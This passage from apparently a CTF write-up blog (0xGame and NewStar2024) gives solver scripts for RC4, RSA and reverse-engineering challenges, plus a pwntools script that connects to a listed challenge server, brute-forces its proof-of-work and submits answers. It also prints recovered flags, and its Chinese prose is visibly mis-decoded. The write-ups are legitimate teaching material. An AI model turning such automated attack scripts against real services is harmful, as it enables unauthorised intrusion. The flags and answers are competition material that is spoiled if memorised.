class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>s=<span class="hljs-string">&#x27;nB9RCjwReif5P1H1MYO6m/hucCGjI6EE9wWEx/E4N+bO5k5ior6MnqAGQfc=&#x27;</span><br>out=base64.b64decode(s)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x9c</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xf7</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">171</span>,<span class="hljs-number">149</span>,<span class="hljs-number">153</span>,<span class="hljs-number">151</span>,<span class="hljs-number">193</span>,<span class="hljs-number">31</span>,<span class="hljs-number">143</span>,<span class="hljs-number">241</span>,<span class="hljs-number">189</span>,<span class="hljs-number">165</span>,<span class="hljs-number">181</span>,<span class="hljs-number">193</span>,<span class="hljs-number">153</span>,<span class="hljs-number">161</span>])<br><br>decrypted = rc4(out, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#0xGame&#123;fd51ce4b-4556-4cf9-9430-67480614e43b&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="crt-1"><a href="#crt-1" class="headerlink" title="crt-1"></a>crt-1</h3><p>eå’Œphiä¸äº’ç´ ï¼Œå…ˆæ±‚å‡ºe&#x2F;&#x2F;2å¯¹åº”çš„mï¼Œå†å¼€æ ¹å·ï¼Œç­”æ¡ˆå°±æ˜¯å…¶ä¸­ä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">n,e = (<span class="hljs-number">1022053332886345327</span>, <span class="hljs-number">294200073186305890</span>)<br>c = <span class="hljs-number">107033510346108389</span><br> <br>phi = <span class="hljs-number">970868178</span> * <span class="hljs-number">1052721012</span><br><span class="hljs-comment">#print(gcd(e,phi))</span><br>d = invese_mod(e//<span class="hljs-number">2</span>, phi)<br>m2 = <span class="hljs-built_in">pow</span>(c,d,n)<br> <br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = x^<span class="hljs-number">2</span> - m2<br>res = f.roots(multiplicities=<span class="hljs-literal">False</span>)<br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    MD5(<span class="hljs-built_in">int</span>(i))<br><br><span class="hljs-string">&#x27;127016d0be858ef48a99723710ad4d49&#x27;</span><br><span class="hljs-string">&#x27;f4107420d94cc7037114376d8566d4ef&#x27;</span><br><span class="hljs-string">&#x27;3932f6728585abbf751a212f69276d3e&#x27;</span><br><span class="hljs-string">&#x27;15820afdb9a129e89e40e57f40ff8de9&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h2><h3 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h3><p>å‰åŠéƒ¨åˆ†æ±‚å¾—å››ä¸ªå­—ç¬¦ï¼ŒååŠéƒ¨åˆ†æ³¨æ„å…ˆfromhex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    s4 = <span class="hljs-string">&#x27;&#x27;</span>.join([choice(ascii_letters+digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])<br>    <span class="hljs-comment">#print(s4)</span><br>    s20=s4+<span class="hljs-string">&#x27;5mcbb8TCD9muMJy0&#x27;</span><br>    s=sha256(s20.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> s==<span class="hljs-string">&#x27;08d287b38cb45c90dd1a8ab20484d8122119e2e50e50b60300ee30b74a86f456&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(s4)<br>        <span class="hljs-keyword">break</span><br><br>a=<span class="hljs-string">&#x27;edd186458e9679384d4623dcc37845c803f5e70cf8c60fbe5a339de88bbf93540b8ba4e407d97cadaf2fa4499d88dea4a87471&#x27;</span><br>a=<span class="hljs-built_in">bytes</span>.fromhex(a)<br>b=<span class="hljs-string">&#x27;01234567890abcdef&#x27;</span>*<span class="hljs-number">6</span><br>b=<span class="hljs-built_in">bytes</span>.fromhex(b)<br><span class="hljs-built_in">print</span>(b)<br>m=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>   m.append(a[i]^b[i])<br><span class="hljs-built_in">print</span>(m)<br><br>m=[<span class="hljs-number">236</span>, <span class="hljs-number">242</span>, <span class="hljs-number">195</span>, <span class="hljs-number">34</span>, <span class="hljs-number">7</span>, <span class="hljs-number">156</span>, <span class="hljs-number">197</span>, <span class="hljs-number">230</span>, <span class="hljs-number">189</span>, <span class="hljs-number">84</span>, <span class="hljs-number">23</span>, <span class="hljs-number">138</span>, <span class="hljs-number">187</span>, <span class="hljs-number">232</span>, <span class="hljs-number">238</span>, <span class="hljs-number">5</span>, <span class="hljs-number">236</span>, <span class="hljs-number">244</span>, <span class="hljs-number">196</span>, <span class="hljs-number">73</span>, <span class="hljs-number">159</span>, <span class="hljs-number">79</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">132</span>, <span class="hljs-number">195</span>, <span class="hljs-number">143</span>, <span class="hljs-number">220</span>, <span class="hljs-number">221</span>, <span class="hljs-number">199</span>, <span class="hljs-number">3</span>, <span class="hljs-number">255</span>, <span class="hljs-number">198</span>, <span class="hljs-number">100</span>, <span class="hljs-number">165</span>, <span class="hljs-number">199</span>, <span class="hljs-number">66</span>, <span class="hljs-number">190</span>, <span class="hljs-number">245</span>, <span class="hljs-number">167</span>, <span class="hljs-number">19</span>, <span class="hljs-number">241</span>, <span class="hljs-number">84</span>, <span class="hljs-number">91</span>, <span class="hljs-number">169</span>, <span class="hljs-number">222</span>, <span class="hljs-number">166</span>, <span class="hljs-number">52</span>, <span class="hljs-number">3</span>, <span class="hljs-number">185</span>, <span class="hljs-number">158</span>]<br><br>enc=<span class="hljs-string">&#x27;dc8a84436af9bede8c622fb888dbd928dac3f778b2763461b3eeebecebf72ecca302c6a324dbc4c572c43226&#x27;</span><br>enc=<span class="hljs-built_in">bytes</span>.fromhex(enc)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag+=<span class="hljs-built_in">chr</span>(enc[i]^m[i%<span class="hljs-built_in">len</span>(m)])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#0xGame&#123;81682337-6731-91c7-d060-3efcdfe1ba5f&#125;</span><br></code></pre></td></tr></table></figure><h3 id="RSAIV"><a href="#RSAIV" class="headerlink" title="RSAIV"></a>RSAIV</h3><p>å› ä¸ºäº¤äº’çš„æ€»æ—¶é—´è¶³å¤Ÿé•¿ï¼Œchallenge2é€‚åˆyafuæ‰‹åŠ¨è§£åè¾“å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> isqrt<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gmpy2, gcdext<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io= remote(<span class="hljs-string">&#x27;118.195.138.159&#x27;</span>,<span class="hljs-number">10003</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch0</span>(<span class="hljs-params">s</span>):<br>    n,e,c=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=1748540272127031261953491227523826413186688228587730569034148979069843516521168331238821457</span><br>    <span class="hljs-comment"># e=3</span><br>    <span class="hljs-comment"># c=73664223980107312196785660420184405948303349111082519137365225806576685634069671168357</span><br>    k = <span class="hljs-number">0</span><br>    t = gmpy2.iroot(c,e)<br>    <span class="hljs-keyword">if</span> t[<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment">#print(t[0])</span><br>        sl(<span class="hljs-built_in">str</span>(t[<span class="hljs-number">0</span>]).encode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            m = gmpy2.iroot(k*n+c,e)<br>            <span class="hljs-keyword">if</span> m[<span class="hljs-number">1</span>]:<br>                <span class="hljs-comment">#print(bytes_to_long(m[0]))</span><br>                sl(<span class="hljs-built_in">str</span>(bytes_to_long(m[<span class="hljs-number">0</span>])).encode())<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                k += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch1</span>(<span class="hljs-params">s</span>):<br>    n,e,c,dp=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=174434352212179643958855935833036063001</span><br>    <span class="hljs-comment"># e=0x10001</span><br>    <span class="hljs-comment"># c=39466599612748960141905412873983556787</span><br>    <span class="hljs-comment"># dp=6171497056913161467</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>        t = (dp * e - <span class="hljs-number">1</span>) % i        <span class="hljs-comment">#è¿™æ˜¯p-1å‰é¢çš„ç³»æ•°</span><br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            p = (dp * e - <span class="hljs-number">1</span>) // i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>                q = n // p<br>                d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>                <span class="hljs-comment">#print(str(pow(c,d,n)).encode())</span><br>                sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">pow</span>(c,d,n)).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch2</span>(<span class="hljs-params">s</span>):<br>    n,e,c=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=319642561199483600677262826186024249019</span><br>    <span class="hljs-comment"># e=170254189003332402684383900760365999599</span><br>    <span class="hljs-comment"># c=315096655202591609017165088376826841837</span><br>    <span class="hljs-comment"># p,q=fermat(n)</span><br>    <span class="hljs-comment"># phi=(p-1)*(q-1)</span><br>    <span class="hljs-comment"># d=inverse(e,phi)</span><br>    <span class="hljs-comment"># m=pow(c,d,n)</span><br>    <span class="hljs-comment"># print(m)</span><br>    <span class="hljs-comment"># sl(str(m).encode())</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch3</span>(<span class="hljs-params">s</span>):<br>    n,e1,c1,e2,c2=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n = 123859953327496855816310504481883257257</span><br>    <span class="hljs-comment"># c1 = 115331678509320635403714895034425874310</span><br>    <span class="hljs-comment"># c2 = 19516419686488748417408440624144239780</span><br>    <span class="hljs-comment"># e1 = 162726227029902673640708475886431248549</span><br>    <span class="hljs-comment"># e2 = 92095361035743610350805143550253960191</span><br>    _ ,s1 ,s2 = gcdext(e1,e2)<br>    m = <span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(m).encode())<br>    sl(<span class="hljs-built_in">str</span>(m).encode())<br><br>s=ru(<span class="hljs-string">&#x27;sha256(XXXX+&#x27;</span>)<br><span class="hljs-built_in">print</span>(s)<br>s1=io.recvuntil(<span class="hljs-string">b&#x27;) == &#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(s1)<br>s2=io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(s2)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    s4 = <span class="hljs-string">&#x27;&#x27;</span>.join([choice(ascii_letters+digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])<br>    <span class="hljs-comment">#print(s4)</span><br>    s20=s4+s1.decode()<br>    s=sha256(s20.encode()).hexdigest()<br>    <span class="hljs-comment">#print(type(s))</span><br>    <span class="hljs-keyword">if</span> s==s2.decode():<br>        <span class="hljs-built_in">print</span>(s4)<br>        sl(s4.encode())<br>        <span class="hljs-keyword">break</span><br><br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch0(s)<br>sla(<span class="hljs-string">&#x27;input choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch1(s)<br><span class="hljs-comment"># sla(&#x27;input choice:&#x27;,b&#x27;2&#x27;)</span><br><span class="hljs-comment"># io.recvuntil(&#x27;&gt;&#x27;,drop=True)</span><br><span class="hljs-comment"># s=ru(&#x27;)&#x27;)</span><br><span class="hljs-comment"># ch2(s)</span><br>sla(<span class="hljs-string">&#x27;input choice:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch3(s)<br>inter()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¼ªéšæœºæ•°</tag>
      
      <tag>z3</tag>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>pydas</tag>
      
      <tag>unityé€†å‘</tag>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>ä¸­å›½å‰©ä½™å®šç†</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2024éƒ¨åˆ†Reverseä¸Crypto</title>
    <link href="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/"/>
    <url>/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">fork` å‡½æ•°ä¼šè¿”å›ä¸¤æ¬¡ï¼šä¸€æ¬¡åœ¨çˆ¶è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹çš„ `pid`ï¼Œä¸€æ¬¡åœ¨å­è¿›ç¨‹ä¸­è¿”å› `0<br></code></pre></td></tr></table></figure><p>å¦‚æœ v11 &gt; 0ï¼Œè¡¨ç¤ºè¿™æ˜¯çˆ¶è¿›ç¨‹ï¼Œå¦‚æœ v11 &#x3D;&#x3D; 0ï¼Œè¡¨ç¤ºè¿™æ˜¯å­è¿›ç¨‹,å¦‚æœ v11 &lt; 0ï¼Œè¡¨ç¤º fork å¤±è´¥</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728473115276-9b86aa2f-c771-42d9-ba80-94f3c11dd647-17300804958261.png" class="" title="img"><p>å¯ä»¥ä¸çœ‹fatherï¼Œç›´æ¥åŠ å‚æ•°è°ƒè¯•</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728476950611-fdaa4dcc-75ae-4e9b-811a-3a6e36f8ddca-17300804958273.png" class="" title="img"><p>ä¸ªäººè§‰å¾—é¢˜ç›®å‡ºé”™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>  <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>  <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=((a[i]&gt;&gt;<span class="hljs-number">5</span>)|(a[i]&lt;&lt;<span class="hljs-number">3</span>)%<span class="hljs-number">256</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment">#flag&#123;Do_you_really_know_ptrace?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h3><p>nativeå±‚å®ç°é€»è¾‘ï¼ŒåŠ¨æ€æ³¨å†Œï¼Œçœ‹JNI_Onloadå‡½æ•°</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872332857-5d6a1390-a722-496c-8274-8f18873facb4-17300804958275.png" class="" title="img"><p>çœ‹CheckActivityç±»ï¼Œå‘ç°CheckData</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872220912-dc5229ef-3aa6-4313-9e05-7ebdff944ccd-17300804958277.png" class="" title="img"><p>åŠ è½½UseLessï¼Œå¹¶é‡æ–°è®¾ç½® CHAR_DATA ï¼Œåç»­è°ƒç”¨base64</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872318849-2535458a-855e-40d1-b254-8e9594d61bc1-17300804958279.png" class="" title="img"><p>åç»­é¦–å°¾è°ƒæ¢å†é«˜ä½ä½äº’æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>  <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=((a[i]&lt;&lt;<span class="hljs-number">4</span>)|(a[i]&gt;&gt;<span class="hljs-number">4</span>))%<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)//<span class="hljs-number">2</span>):<br>    a[i],a[<span class="hljs-built_in">len</span>(a)-i-<span class="hljs-number">1</span>]=a[<span class="hljs-built_in">len</span>(a)-i-<span class="hljs-number">1</span>],a[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872618528-c31541fe-239a-4bfe-8d0c-52fe72857325-173008049582711.png" class="" title="img"><h3 id="SMC-math"><a href="#SMC-math" class="headerlink" title="SMC_math"></a>SMC_math</h3><p>smcå¤„ç†å¾—å¥½å°±æ˜¯æ ‡å‡†z3,å¯ä»¥å…ˆå…¨undefineåœ¨force</p><img 